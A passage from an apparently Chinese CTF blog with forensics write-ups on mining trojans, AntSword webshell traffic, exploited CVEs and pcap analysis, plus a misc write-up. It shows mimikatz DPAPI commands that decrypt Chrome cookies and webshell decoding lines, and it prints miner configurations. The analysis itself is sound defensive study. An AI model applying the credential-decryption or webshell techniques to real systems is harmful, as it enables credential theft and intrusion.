href="https://blog.csdn.net/weixin_44365415/article/details/130108868?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170893659616800186546943%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170893659616800186546943&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-130108868-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B2%A1%E6%9C%89ens33&spm=1018.2226.3001.4187">【ubuntu虚拟机】ens33未出现在ifconfig问题</a></p><pre><code>ifconfig ens33 updhclient ens33ifconfig</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262042502.png" alt="image-20240226204253452"></p><p>得到ip地址<code>192.168.160.158</code>  当然虚拟机的网络连接模式要选NAT模式 </p><p>xshell连接成功 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262045691.png" alt="image-20240226204537637"></p><p>使用xftp将文件系统中的文件全部下载下来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262046088.png" alt="image-20240226204652002"></p><p>然后使用D盾进行扫描 </p><pre><code>\etc\redis\redis-server</code></pre><p>这个文件里面存在后门 看一下文件结构 还是个linux可执行程序 那这个就是挖矿病毒的路径了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262119503.png" alt="image-20240226211924453"></p><p>进行md5加密</p><pre><code>6f72038a870f05cbf923633066e48881</code></pre><h3 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271248631.png" alt="image-20240227124816577"></p><p>由第一题 我们可得挖矿病毒程序在<code>\etc\redis</code>文件夹下 那在同文件夹下一定还有关于挖矿病毒的文件</p><p>找到<code>redis.conf</code>配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271251198.png" alt="image-20240227125129155"></p><pre><code>这段代码看起来是关于加密货币挖矿的配置信息，可能是针对 XMRig 软件的配置。让我逐一解释：&quot;pools&quot;: [...]: 这是一个列表，包含了挖矿池的配置信息。&quot;algo&quot;: null: 这里应该指定挖矿所使用的算法，但是目前是空值，可能需要根据具体情况填写。&quot;coin&quot;: null: 指定挖矿的加密货币种类，同样是空值。&quot;url&quot;: &quot;donate.v2.xmrig.com:3333&quot;: 挖矿池的地址，通常包括主机名和端口号。&quot;user&quot;: &quot;YOUR_WALLET_ADDRESS&quot;: 这里需要填写你的数字货币钱包地址，挖矿所得的货币会发送到这个地址。&quot;pass&quot;: &quot;x&quot;: 密码，通常是 &#39;x&#39; 或者是空值。&quot;rig-id&quot;: null: 矿机的标识符，同样是空值。&quot;nicehash&quot;: false: 表示是否使用 NiceHash 挖矿，这里是 false，即不使用 NiceHash。&quot;keepalive&quot;: false: 是否保持挖矿连接活跃，这里是 false。&quot;enabled&quot;: true: 挖矿池是否启用，这里是 true。&quot;tls&quot;: false: 是否使用 TLS/SSL 连接，这里是 false。&quot;tls-fingerprint&quot;: null: TLS/SSL 指纹，同样是空值。&quot;daemon&quot;: false: 是否使用挖矿守护进程模式，这里是 false。&quot;socks5&quot;: null: SOCKS5 代理，同样是空值。&quot;self-select&quot;: null: 自选功能，为空值。&quot;submit-to-origin&quot;: false: 是否将挖矿结果提交到原始地址，这里是 false。</code></pre><p>很明显矿池域名是</p><pre><code>donate.v2.xmrig.com</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271300313.png" alt="image-20240227130018273"></p><pre><code>3fca20bb92d0ed67714e68704a0a4503</code></pre><h3 id="3-4"><a href="#3-4" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271300548.png" alt="image-20240227130039488"></p><p>查看服务器的历史命令</p><p>看到运行jar包之后生成了一个<code>nohup.log</code>日志文件 在<code>\home\app</code>文件夹下 在里面看到了很多shiro链 那就是shiro反序列化漏洞</p><pre><code>shirodeserialization3ee726cb32f87a15d22fe55fa04c4dcd</code></pre><h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271833436.png" alt="image-20240227183332371"></p><p>直接用last命令看一下登陆记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271835827.png" alt="image-20240227183517764"></p><p>这几个就是</p><pre><code>81.70.166.3c76b4b1a5e8c9e7751af4684c6a8b2c9</code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271835095.png" alt="image-20240227183555028"></p><p>查看nginx服务器的日志文件 </p><pre><code>cat \var\log\nginx\access.log</code></pre><p>直接拉到最后</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271858068.png" alt="image-20240227185804997"></p><pre><code>Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)mozilla/5.0(compatible;baiduspider/2.0;+http://www.baidu.com/search/spider.html)6ba8458f11f4044cce7a621c085bb3c6</code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271901846.png" alt="image-20240227190112787"></p><p>猜测是sshd软连接</p><p>直接搜一下</p><pre><code>history | grep ssh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271908952.png" alt="image-20240227190834907"></p><p>查看这个文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271909843.png" alt="image-20240227190903805"></p><p>UsePAM为YES的话就是通过ssh软连接进行权限维持</p><p>再看一下ssh</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271911412.png" alt="image-20240227191140366"></p><p>连接上了kali的ssh</p><pre><code>/root/.ssh/authorized_keysa1fa1b5aeb1f97340032971c342c4258</code></pre><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271912351.png" alt="image-20240227191218301"></p><p>上面提到的redis挖矿病毒也算 </p><pre><code>/lib/systemd/system/redis.service</code></pre><p>这个文件一直在开启redis文件进行自动挖矿</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271913573.png" alt="image-20240227191354528"></p><pre><code>b2c5af8ce08753894540331e5a947d35</code></pre><h2 id="SmallSword"><a href="#SmallSword" class="headerlink" title="SmallSword"></a>SmallSword</h2><h3 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402192341144.png" alt="image-20240219234130980"></p><p>找到蚁剑连接部分的流量  解一下url编码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402201724005.png" alt="image-20240220172412934"></p><pre><code>6ea280898e404bfabd0ebb702327b19f</code></pre><p>看到<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0)</code> 这部分前面就是蚁剑连接的密码</p><pre><code>6ea280898e404bfabd0ebb702327b19f</code></pre><h3 id="2-5"><a href="#2-5" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202211103.png" alt="image-20240220221117025"></p><p>直接找蚁剑连接的流量包一个个解密看内容就行 这个没什么技巧</p><p>需要注意一点蚁剑流量在url编码之前会先进行一次base64加密 但是加密之后可能会在密文前添加不定字符 进行一个简单的免杀 这会使我们在解密的时候 如果不去掉这些额外字符解出来肯定会是乱码</p><p>这个冗余字符的长度我们可以观察蚁剑流量传输的代码 </p><p>下面是例子</p><pre><code>$p = base64_decode(substr($_POST[&quot;m0300de6257f67&quot;], 2));substr函数的作用是截取字符串中指定长度的字符语法是int substr(string str, int start , int length)   那么对于上面这一部分蚁剑流量 就可以理解为他从下标索引为2的字符(实际上就是第三个字符)开始截取 并进行base64解密</code></pre><p>那么对于这个流量 我们也可以找到相关的语句 发现他没有进行免杀 直接从头开始解base64</p><pre><code>$D=base64_decode($_POST[&quot;0x72b3f341e432&quot;]);</code></pre><p>解密142条流量包的数据 发现存在写入一个名为<code>hacker.txt</code>的文件的操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202333845.png" alt="image-20240220233301767"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202332884.png" alt="image-20240220233238792"></p><p>这部分就是攻击者留存的值</p><pre><code>ad6269b7-3ce2-4ae8-b97f-f259515e7a91 </code></pre><h3 id="3-5"><a href="#3-5" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202334167.png" alt="image-20240220233403097"></p><p>第130个数据包处进行解密 发现是读取了一个<code>huorong.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202354803.png" alt="image-20240220235426750"></p><p>同时导出http最大的文件也是这个包里面的 名为<code>info1.php</code> 提取出来看一下结构</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202357252.png" alt="image-20240220235729184"></p><p>删掉前面的<code>-&gt;|</code>  改名为<code>1.exe</code></p><p>用pyinstxtractor.py来解析一下 发现一个<code>2.pyc</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210006772.png" alt="image-20240221000601564"></p><p>在线反编译一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210009827.png" alt="image-20240221000937720"></p><p>会生成一个<code>test.jpg</code>图片 运行一下 但是需要改下宽高 直接梭了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210016206.png" alt="image-20240221001658169"></p><h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="1-6"><a href="#1-6" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402211137806.png" alt="image-20240221113750721"></p><p>观察整个流量包 很明显的爆破过程是先扫目录 扫到登陆目录在爆破用户名爆破用户密码  先筛选一波</p><pre><code>http &amp;&amp; ip.src == 172.31.0.2 &amp;&amp; ip.dst == 172.31.0.1 &amp;&amp; http.response.code == 200</code></pre><p>观察发现 当密码不对的时候 状态码是300</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212305686.png" alt="image-20240221230515587"></p><p>继续翻找 发现一个状态码为200的包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212305979.png" alt="image-20240221230540903"></p><p>追踪tcp流 找到账号和密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212306833.png" alt="image-20240221230608763"></p><pre><code>TMjpxFGQwD:123457</code></pre><h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>一种新的筛选方法 直接筛选状态码的内容</p><pre><code>tcp contains &quot;&#123;\&quot;errCode\&quot;:200&#125;&quot;</code></pre><p>注意双引号用\转义一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212353738.png" alt="image-20240221235343684"></p><h3 id="2-6"><a href="#2-6" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212353601.png" alt="image-20240221235355531"></p><p>大致了解一下越权漏洞 就是一种越过对特定资源读写的权限的漏洞 分为水平越权和垂直越权 水平就是同级别(权限)的用户 可以越权访问、修改或者删除的非法操作 垂直又分为向下越权和向上越权 </p><p>通俗来讲就是 当权限验证做的不好的时候 抓包之后修改url后面的用户对应的参数 就可以实现越权访问</p><p>观察发现 在密码爆破结束之后是第1585个包 userid&#x3D;2</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128129.png" alt="image-20240222234629544"></p><p>拉倒最后 发现userid变成了1  实现了越权漏洞利用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128877.png" alt="image-20240222234717512"></p><p>此时的cookie为</p><pre><code>accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=1</code></pre><p>进行md5加密</p><pre><code>383c74db4e32513daaa1eeb1726d7255</code></pre><h3 id="3-6"><a href="#3-6" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128473.png" alt="image-20240222235256927"></p><p>没啥技巧 就是翻就完事了 或者同第一题筛选一下也可以</p><pre><code>tcp contains &quot;jdbc&quot; &amp;&amp; tcp contains &quot;username&quot; &amp;&amp; tcp contains &quot;passwd&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128607.png" alt="image-20240223000811948"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128790.png" alt="image-20240223000828576"></p><pre><code>zyplayer:1234567</code></pre><h3 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128407.png" alt="image-20240223000903469"></p><p>在使用jdbc漏洞读取了数据库的账号密码之后 在向下翻找数据包 在1603流的内容中看到了很明显的反弹shell的语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242110555.png" alt="image-20240224211033469"></p><p>可以找到这个文件的名字是<code>custom.dtd.xml</code> 那向前翻找一个包 也可以找到这个文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242111087.png" alt="image-20240224211100008"></p><p>直接搜一下这段 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242112639.png" alt="image-20240224211226582"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242113327.png" alt="image-20240224211343250"></p><p>可以找到漏洞编号为<code>CVE-2022-21724</code></p><pre><code>CVE-2022-21724:custom.dtd.xml</code></pre><h3 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251559151.png" alt="image-20240225155907092"></p><p> 看到第1611个流里面 在获取系统权限之后 使用curl命令 下载了fscan工具 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251606083.png" alt="image-20240225160616995"></p><pre><code>fscan</code></pre><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><h3 id="1-7"><a href="#1-7" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251608375.png" alt="image-20240225160808322"></p><p>这个其实很明显了 TCP协议的流量 第一个包是<code>192.168.246.1</code>向<code>192.168.246.28</code>发送SYN包 表示建立连接 那肯定<code>192.168.246.28</code>就是被入侵的主机ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251623622.png" alt="image-20240225162342568"></p><pre><code>192.168.246.28</code></pre><h3 id="2-7"><a href="#2-7" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251624590.png" alt="image-20240225162401549"></p><p>也是在追踪tcp的第一个流里面 看到了输入用户名密码成功登陆被入侵主机的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251624897.png" alt="image-20240225162450792"></p><pre><code>youcannevergetthis</code></pre><h3 id="3-7"><a href="#3-7" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251626451.png" alt="image-20240225162627383"></p><p>看到在被入侵主机里面执行了<code>ls</code>命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251645704.png" alt="image-20240225164549663"></p><p>直接横着看就行 第二个是<code>Downloads</code> </p><h3 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251653428.png" alt="image-20240225165326379"></p><p>看到被入侵主机中执行了<code>cat /etc/passwd</code>命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251654211.png" alt="image-20240225165437163"></p><p>那倒数第二个用户名就是<code>mysql</code></p><h2 id="server-save"><a href="#server-save" class="headerlink" title="server_save"></a>server_save</h2><h3 id="1-8"><a href="#1-8" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252028117.png" alt="image-20240225202807050"></p><p>类似与tcpdump4的做法 先找到进入终端的流 是108流 看到是先用python创建了一个交互式终端 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252059240.png" alt="image-20240225205912166"></p><p>向前翻 第106流是一个反弹shell的文件<code>bbbb.sh</code> 第107流就是执行这个反弹shell的码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252103418.png" alt="image-20240225210303379"></p><p>105流可以看到执行了传入cmd参数 内容是id 回显内容显示此时的用户是root 说明这个时候拿到了root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252106716.png" alt="image-20240225210619658"></p><p>那前面一个流 就是拿到root权限的方法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252106999.png" alt="image-20240225210648923"></p><p>直接搜一下这句 就找到了CVE编号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252107153.png" alt="image-20240225210712105"></p><pre><code>CVE-2022-22965</code></pre><h3 id="2-8"><a href="#2-8" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252108936.png" alt="image-20240225210811880"></p><p>这个反弹shell前面已经分析过了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252108604.png" alt="image-20240225210303379"></p><pre><code>192.168.43.128:2333</code></pre><h3 id="3-8"><a href="#3-8" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252109883.png" alt="image-20240225210912839"></p><p>这个就是翻do文件夹里面的文件系统 在<code>\home\guests</code>文件夹下找到一个<code>main</code>文件夹 放到沙箱里面分析一下 就是个elf可执行程序病毒文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252132078.png" alt="image-20240225213247982"></p><pre><code>main</code></pre><h3 id="4-4"><a href="#4-4" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252133969.png" alt="image-20240225213302908"></p><p>直接在沙箱里面看分析结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252135563.png" alt="image-20240225213502521"></p><p>添加了<code>ll</code>用户 密码明文为<code>123456</code></p><pre><code>ll:123456</code></pre><h3 id="5-2"><a href="#5-2" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252135108.png" alt="image-20240225213547063"></p><p>在沙箱的异常行为分析中 看到这个病毒文件创建了一个隐藏文件或者系统文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252137942.png" alt="image-20240225213714896"></p><p>我们看一下这个<code>.log.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252137785.png" alt="image-20240225213736742"></p><p>那就是这个ip了</p><pre><code>172.105.202.239</code></pre><h3 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252138596.png" alt="image-20240225213800550"></p><p>两个文件的话 那应该就是<code>\home\guests\.idea</code>下的两个文件了 看创建日期也能判断 这是在main运行之后产生的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252140318.png" alt="image-20240225214056282"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252140884.png" alt="image-20240225214031850"></p><pre><code>lolMiner、mine_doge.sh</code></pre><h3 id="7、8"><a href="#7、8" class="headerlink" title="7、8"></a>7、8</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252141823.png" alt="image-20240225214131774"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252142603.png" alt="image-20240225214216553"></p><p>都在<code>mine_doge.sh</code>这个文件夹下了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252142041.png" alt="image-20240225214241997"></p><pre><code>POOL=doge.millpools.cc:5567WALLET=DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024古剑山</title>
      <link href="/2024/02/08/2023%E5%8F%A4%E5%89%91%E5%B1%B1/"/>
      <url>/2024/02/08/2023%E5%8F%A4%E5%89%91%E5%B1%B1/</url>
      
        <content type="html"><![CDATA[<h1 id="2023古剑山"><a href="#2023古剑山" class="headerlink" title="2023古剑山"></a>2023古剑山</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="数独-gaps拼图"><a href="#数独-gaps拼图" class="headerlink" title="数独(gaps拼图)"></a>数独(gaps拼图)</h3><p>给了一个image.png和sudoku.png 先把数独解了一下 得到下面的结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401311803025.png" alt="image-20240131180350976"></p><p>但是不知道有什么用 再看一下image.png 需要重新拼一下图 就用gaps就行了</p><p>原图像的大小是630x630 小图片是9x9 因此使用的size参数就是70</p><pre><code>gaps --image=image.png --generations=50 --populations=200 --size=70 --save </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401311810545.jpg" alt="image_solution1"></p><p>这里我当时是以为数独有什么用 把解好的数独都写在原图片之后再拼的 实际上我们拼完之后直接按照从上到下 从左到右的顺序读flag就行</p><h3 id="幸运饼干-DPAPI技术-Chrome数据加密"><a href="#幸运饼干-DPAPI技术-Chrome数据加密" class="headerlink" title="幸运饼干(DPAPI技术 Chrome数据加密)"></a>幸运饼干(DPAPI技术 Chrome数据加密)</h3><p>附件是一个hint.jpg和flag.zip flag.zip里面有个和hint.jpg大小一样的文件 直接明文攻击 先将hint.jpg压缩为hint.zip 在ARCHPR里面进行明文攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312201871.png" alt="image-20240131211749661"></p><p>得到密码</p><pre><code>sv@1v3z</code></pre><p>解压压缩包 得到一个压缩包 一个admin.txt和Cookie文件 先看一下Cookie文件格式 用file命令 是个sql数据库文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312237874.png" alt="image-20240131223747841"></p><p>admin.txt里面是使用mimikatz对计算机进行分析的记录  看到里面有一个NTML密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312244139.png" alt="image-20240131224435108"></p><p>解一下 密码是<code>54231</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401312311633.png" alt="image-20240131231126598"></p><h4 id="先看一下前置知识"><a href="#先看一下前置知识" class="headerlink" title="先看一下前置知识"></a>先看一下前置知识</h4><p>DPAPI，Data Protection Application Programming Interface，是Windows系统的一个数据保护接口，它本质上使用了Windows通过用户自己登录（sids，登录密码等），以及域登录后的一些数据生成的密钥，并且使用内置的算法，对用户指定的数据进行加密。通常Windows上的浏览器历史数据，邮件加密，wifi密码等等都会以这种方式进行数据加密。</p><p>Chrome使用DPAPI保存了我们的登录密码和cookie值</p><p>用户使用Chrome访问网站进行登录时，可以选择是否保存密码。当选择保存密码时，Chrome先将密码进行加密，再保存在SQLite数据库文件中，数据库文件路径位于：</p><pre><code>%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code></pre><p>同上，保存Cookie时，数据库文件路径为：</p><pre><code>%LocalAppData%\Google\Chrome\User Data\Default\Cookies</code></pre><p>存储的cookie值被加密为DPAPI blob来进行保护；我们可以通过使用Mimikatz这个工具来对Chrome中的SQLite数据库进行解析：</p><pre><code>mimikatz dpapi::chrome /in:&#39;%LocalAppData%\Google\Chrome\User Data\Default\Cookies&#39;</code></pre><p>解密DPAPI blob用到的相关概念：</p><pre><code>DPAPI blob：一段密文，可以使用Master Key对其解密Master Key：64字节，用于解密DPAPI blob；使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中Master Key file：二进制文件，可以使用用户登录密码对其解密，得到Master Key</code></pre><p>对采用DPAPI技术加密的数据进行解密，需要获取当前操作系统登录用户对应的 Master Key，而获取 MasterKey 需要知道用户名、密码以及对应的SID，然后利用这些数据生成一个 blob 加密过程中使用的 MasterKey，从而对目标blob进行解密</p><p>大致的过程是</p><pre><code>dpapi::masterkey /in:&#123;masterkeyfile&#125; /sid:&#123;sid&#125; /password:&#123;password&#125; /protected</code></pre><p>得到masterkey之后 使用masterkey(原key值或者sha1加密值都可以)解密Cookies&#x2F;logindata</p><pre><code>dpapi::chrome /in:&#123;Cookies&#125; /masterkey:&#123;masterkey&#125; /unprotect</code></pre><p>这样就可以得到Cookies的加密数据的hex值或者直接得到明文</p><p>toto✌🏻的这篇文章写的很全面 狠狠膜拜了</p><p><a href="https://blog.csdn.net/jyttttttt/article/details/134972038?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170670869216800192291692%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=170670869216800192291692&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-134972038-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=mimikatz%20blob%E8%A7%A3%E5%AF%86&spm=1018.2226.3001.4187">电子取证中Chrome各版本解密Cookies、LoginData账号密码、历史记录</a></p><p>我们用sqlcipher打开Cooike这个sql数据库文件 看到有一个encrypted_value 提示是blob 那就是一个利用DPAPI技术加密的Chrome数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402010011268.png" alt="image-20240201001135197"></p><p>我们结合前置知识 现在我们有了用户名 密码 在flag.zip解压后的文件里面还有一个压缩包 文件名就是SID 压缩包里面的文件应该就是masterkey文件</p><pre><code>S-1-5-21-726299542-2485387390-1117163988-1001</code></pre><p>有了这些我们就可以得到masterkey</p><pre><code>dpapi::masterkey /in:.\S-1-5-21-726299542-2485387390-1117163988-1001\e5f8e386-7041-4f16-b02d-304c71040126 /sid:S-1-5-21-726299542-2485387390-1117163988-1001 /password:54231 /protected </code></pre><p><font color='red'>这个地方遇到了几个问题 一是Cookies文件解压之后在文件夹里面是看不到的 但是用vscode打开文件夹作为工作区是可以看到的 二是注意一下最好是将文件夹或者Cookies文件直接放在mimikatz程序的文件夹中 放在其他位置有可能不出结果</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402011958520.png" alt="image-20240201195817441"></p><p> 下面就是用masterkey解密Cookies文件</p><pre><code>dpapi::chrome /in:.\Cookies /masterkey:7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac /unprotect</code></pre><p>直接得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402011959283.png" alt="image-20240201195956233"></p><p>另 在学习姿势的时候 还看到了一些将Cookies识别分割为数据库的方法</p><pre><code>binwalk Cookiesdd if=Cookies bs=1 skip=0 of=1.db</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012017942.png" alt="image-20240201201726904"></p><h3 id="同类型的题：-红明谷CTF-2022-MissingFile"><a href="#同类型的题：-红明谷CTF-2022-MissingFile" class="headerlink" title="同类型的题：[红明谷CTF 2022]MissingFile"></a>同类型的题：[红明谷CTF 2022]MissingFile</h3><p><font color='red'>我们再来看一下这道类似的题 主要是学习一下面对这种题的思路和解题步骤 </font></p><p>附件是一个内存镜像文件<code>memory</code> 题目描述为</p><pre><code>好像被攻击者入侵了，但是赶到现场的时候，已经只剩下一个空的文件夹了，快照能找到攻击者留下的秘密吗？</code></pre><p>首先看一下被入侵的痕迹 </p><pre><code>.\volatility.exe -f E:\Desktop\比赛\古剑山\misc\[红明谷CTF2022]MissingFile\memory --profile=Win7SP1x86_23418 hashdump</code></pre><p>可以看到有一个link3用户 还有一个NewGuest用户 既然是被入侵 那NewGuest应该就是攻击者入侵之后创建的账户 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012032769.png" alt="image-20240201203208646"></p><p>NewGuest用户的密码还是个可破解的哈希值 <code>123456</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012059018.png" alt="image-20240201205917974"></p><p>再看一下攻击用户进行的文件操作  看到使用了mimikatz的记录</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\古剑山\misc\[红明谷CTF2022]MissingFile\memory --profile=Win7SP1x86_23418 filescan | findstr &quot;NewGuest&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012031203.png" 